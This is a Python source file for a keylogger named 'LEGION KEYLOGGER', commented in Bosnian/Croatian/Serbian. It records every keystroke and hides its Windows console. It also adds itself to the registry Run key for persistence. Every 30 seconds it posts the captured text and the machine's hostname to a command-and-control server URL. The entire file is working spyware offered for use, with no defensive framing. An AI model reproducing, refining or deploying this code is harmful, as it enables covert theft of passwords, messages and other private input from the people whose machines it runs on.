#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import threading
import time
import requests
import socket  # ← DODAJ OVO!
import datetime  # ← DODAJ OVO!
from pynput import keyboard

# ----- KONFIGURACIJA -----
# 🔁 PROMIJENI URL NA SVOJ RENDER SERVER!
SERVER_URL = "https://legion-c2.onrender.com/keylog"  # ← ŠALJI OVDJE!
SEND_INTERVAL = 30  # Šalje svakih 30 sekundi

log_buffer = ""
buffer_lock = threading.Lock()
shift_pressed = False

def on_press(key):
    global log_buffer, shift_pressed

    try:
        char = key.char
        if char is not None:
            if shift_pressed and char.isalpha():
                char = char.upper()
            log_buffer += char
            return
    except AttributeError:
        pass

    # Specijalni tasteri
    special = {
        keyboard.Key.space: " ",
        keyboard.Key.enter: "\n",
        keyboard.Key.tab: "\t",
        keyboard.Key.backspace: "[BACKSPACE]",
        keyboard.Key.delete: "[DELETE]",
        keyboard.Key.shift_l: None,
        keyboard.Key.shift_r: None,
        keyboard.Key.ctrl_l: "[CTRL]",
        keyboard.Key.ctrl_r: "[CTRL]",
        keyboard.Key.alt_l: "[ALT]",
        keyboard.Key.alt_r: "[ALT]",
        keyboard.Key.cmd: "[WIN]",
        keyboard.Key.up: "[UP]",
        keyboard.Key.down: "[DOWN]",
        keyboard.Key.left: "[LEFT]",
        keyboard.Key.right: "[RIGHT]",
    }

    if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        shift_pressed = True
        return

    rep = special.get(key)
    if rep is not None:
        log_buffer += rep

def on_release(key):
    global shift_pressed
    if key == keyboard.Key.shift_l or key == keyboard.Key.shift_r:
        shift_pressed = False

def send_to_server(data):
    """Šalje logove na C2 server"""
    if not data:
        return
        
    try:
        # Pokušaj sa JSON formatom
        headers = {'Content-Type': 'application/json'}
        payload = {
            "id": socket.gethostname(),
            "data": data,
            "timestamp": datetime.datetime.now().isoformat()
        }
        
        print(f"[*] Slanje {len(data)} karaktera na {SERVER_URL}...")
        response = requests.post(SERVER_URL, json=payload, headers=headers, timeout=10)
        
        if response.status_code == 200:
            print(f"✓ Poslato {len(data)} karaktera")
            print(f"✓ Odgovor: {response.json()}")
        else:
            print(f"✗ Server greška: {response.status_code}")
            print(f"✗ Odgovor: {response.text}")
            # Pokušaj sa raw data ako JSON ne radi
            try:
                response = requests.post(SERVER_URL, data=data, timeout=10)
                if response.status_code == 200:
                    print(f"✓ Poslato {len(data)} karaktera (raw)")
                else:
                    print(f"✗ Server greška (raw): {response.status_code}")
            except Exception as e2:
                print(f"✗ Neuspješno slanje (raw): {e2}")
    except Exception as e:
        print(f"✗ Neuspješno slanje: {e}")

def periodic_sender():
    global log_buffer
    while True:
        time.sleep(SEND_INTERVAL)
        if log_buffer:
            with buffer_lock:
                to_send = log_buffer
                log_buffer = ""
            threading.Thread(target=send_to_server, args=(to_send,), daemon=True).start()

def hide_console():
    if sys.platform == "win32" and getattr(sys, 'frozen', False):
        import ctypes
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

def add_to_startup():
    try:
        import winreg
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        winreg.SetValueEx(handle, "KeyloggerRelay", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(handle)
        print("✓ Program dodat u autostart")
    except Exception as e:
        print(f"✗ Nije moguće dodati u autostart: {e}")

if __name__ == "__main__":
    hide_console()
    add_to_startup()
    
    print("="*50)
    print("🐉 LEGION KEYLOGGER")
    print("="*50)
    print(f"[+] Server: {SERVER_URL}")
    print(f"[+] Slanje svakih {SEND_INTERVAL} sekundi")
    print("="*50)
    
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.daemon = True
    listener.start()
    print("✓ Keylogger listener pokrenut")
    
    sender_thread = threading.Thread(target=periodic_sender, daemon=True)
    sender_thread.start()
    print(f"✓ Slanje na server svakih {SEND_INTERVAL} sekundi")
    print(f"✓ Server: {SERVER_URL}")
    print("Keylogger je aktivan. Počni kucati!")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("Gašenje keyloggera...")
